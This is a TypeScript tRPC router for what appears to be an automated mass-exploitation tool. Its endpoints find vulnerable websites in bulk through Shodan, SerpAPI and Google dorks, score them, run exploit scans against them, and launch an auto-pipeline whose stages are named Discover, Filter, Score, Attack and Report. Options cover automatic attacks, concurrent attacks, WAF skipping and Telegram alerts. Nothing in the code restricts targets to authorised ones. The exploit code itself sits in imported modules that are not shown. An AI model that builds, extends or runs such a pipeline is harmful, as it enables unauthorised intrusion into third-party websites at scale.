/**
 * Discovery & Auto-Pipeline tRPC Router
 * 
 * Endpoints:
 *   - discovery.search: Run mass target discovery (Shodan + SerpAPI + Google Dorks)
 *   - discovery.nonWpScan: Run non-WP exploit scan on a single target
 *   - discovery.startPipeline: Run full auto-pipeline (Discover → Filter → Score → Attack → Report)
 *   - discovery.getPipeline: Get pipeline run status/results
 *   - discovery.getPipelineEvents: Get pipeline events (for real-time updates)
 *   - discovery.getActivePipelines: List all active/recent pipelines
 *   - discovery.cancelPipeline: Cancel a running pipeline
 */

import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import {
  runMassDiscovery,
  type DiscoveryConfig,
} from "../mass-target-discovery";
import { runNonWpExploits } from "../non-wp-exploits";
import {
  runAutoPipeline,
  getPipelineRun,
  getPipelineEvents,
  getActivePipelines,
  cancelPipeline,
} from "../auto-pipeline";

export const discoveryRouter = router({
  /**
   * Mass Target Discovery — search for vulnerable targets
   */
  search: protectedProcedure
    .input(
      z.object({
        keywords: z.array(z.string()).optional(),
        shodanQueries: z.array(z.string()).optional(),
        googleDorks: z.array(z.string()).optional(),
        targetCms: z.array(z.string()).optional(),
        maxResults: z.number().min(1).max(500).optional(),
        minVulnScore: z.number().min(0).max(100).optional(),
        enableShodan: z.boolean().optional(),
        enableSerpApi: z.boolean().optional(),
        enableAiScoring: z.boolean().optional(),
      }),
    )
    .mutation(async ({ input }) => {
      const config: DiscoveryConfig = {
        useShodan: input.enableShodan ?? true,
        useSerpApi: input.enableSerpApi ?? true,
        customQueries: [...(input.keywords || []), ...(input.shodanQueries || []), ...(input.googleDorks || [])],
        targetCms: input.targetCms,
        maxTargets: input.maxResults || 100,
        minVulnScore: input.minVulnScore || 30,
      };

      const result = await runMassDiscovery(config);
      return result;
    }),

  /**
   * Non-WP Exploit Scan — scan a single target for non-WordPress vulnerabilities
   */
  nonWpScan: protectedProcedure
    .input(
      z.object({
        targetUrl: z.string().url(),
        cms: z.string().optional(),
      }),
    )
    .mutation(async ({ input }) => {
      const result = await runNonWpExploits({
        targetUrl: input.targetUrl,
        cms: input.cms,
      });
      return result;
    }),

  /**
   * Start Auto-Pipeline — full automation: Discover → Filter → Score → Attack → Report
   */
  startPipeline: protectedProcedure
    .input(
      z.object({
        // Discovery settings
        keywords: z.array(z.string()).optional(),
        shodanQueries: z.array(z.string()).optional(),
        googleDorks: z.array(z.string()).optional(),
        targetCms: z.array(z.string()).optional(),
        maxResults: z.number().min(1).max(500).optional(),
        minVulnScore: z.number().min(0).max(100).optional(),
        enableShodan: z.boolean().optional(),
        enableSerpApi: z.boolean().optional(),
        enableAiScoring: z.boolean().optional(),

        // Attack settings
        autoAttack: z.boolean().optional(),
        maxConcurrentAttacks: z.number().min(1).max(10).optional(),
        attackOnlyAboveScore: z.number().min(0).max(100).optional(),
        skipWaf: z.boolean().optional(),

        // Non-WP scan
        runNonWpScan: z.boolean().optional(),

        // Notification
        notifyTelegram: z.boolean().optional(),
      }),
    )
    .mutation(async ({ input }) => {
      const pipelineConfig = {
        discovery: {
          useShodan: input.enableShodan ?? true,
          useSerpApi: input.enableSerpApi ?? true,
          customQueries: [...(input.keywords || []), ...(input.shodanQueries || []), ...(input.googleDorks || [])],
          targetCms: input.targetCms,
          maxTargets: input.maxResults || 100,
          minVulnScore: input.minVulnScore || 30,
        },
        autoAttack: input.autoAttack ?? false,
        maxConcurrentAttacks: input.maxConcurrentAttacks ?? 3,
        attackOnlyAboveScore: input.attackOnlyAboveScore ?? 50,
        skipWaf: input.skipWaf ?? false,
        runNonWpScan: input.runNonWpScan ?? true,
        notifyTelegram: input.notifyTelegram ?? true,
      };

      // Run pipeline in background (non-blocking)
      const runPromise = runAutoPipeline(pipelineConfig);
      
      // Wait a bit to get the pipeline ID
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Get the latest pipeline
      const pipelines = getActivePipelines();
      const latest = pipelines[pipelines.length - 1];

      return {
        pipelineId: latest?.id || "unknown",
        message: "Pipeline started — use getPipeline to track progress",
      };
    }),

  /**
   * Get Pipeline Run — get full status and results
   */
  getPipeline: protectedProcedure
    .input(z.object({ pipelineId: z.string() }))
    .query(({ input }) => {
      const run = getPipelineRun(input.pipelineId);
      if (!run) return null;

      return {
        id: run.id,
        phase: run.phase,
        startedAt: run.startedAt,
        completedAt: run.completedAt,
        stats: run.stats,
        aiReport: run.aiReport,
        targets: run.discoveryResult?.targets.slice(0, 50) || [],
        nonWpResults: run.nonWpResults.map(r => ({
          targetUrl: r.targetUrl,
          cms: r.cms,
          totalExploits: r.totalExploits,
          successfulExploits: r.successfulExploits,
          criticalFindings: r.criticalFindings,
          aiSummary: r.aiSummary,
        })),
        attackResults: run.attackResults,
        eventsCount: run.events.length,
      };
    }),

  /**
   * Get Pipeline Events — for real-time updates (polling)
   */
  getPipelineEvents: protectedProcedure
    .input(
      z.object({
        pipelineId: z.string(),
        afterTimestamp: z.number().optional(),
        limit: z.number().min(1).max(200).optional(),
      }),
    )
    .query(({ input }) => {
      let events = getPipelineEvents(input.pipelineId, input.afterTimestamp);
      if (input.limit) {
        events = events.slice(-input.limit);
      }
      return events;
    }),

  /**
   * List Active Pipelines
   */
  getActivePipelines: protectedProcedure.query(() => {
    return getActivePipelines().map(p => ({
      id: p.id,
      phase: p.phase,
      startedAt: p.startedAt,
      completedAt: p.completedAt,
      totalTargets: p.stats.totalScored,
      totalAttacked: p.stats.totalAttacked,
      durationMs: p.stats.durationMs,
    }));
  }),

  /**
   * Cancel Pipeline
   */
  cancelPipeline: protectedProcedure
    .input(z.object({ pipelineId: z.string() }))
    .mutation(({ input }) => {
      const cancelled = cancelPipeline(input.pipelineId);
      return { success: cancelled };
    }),
});
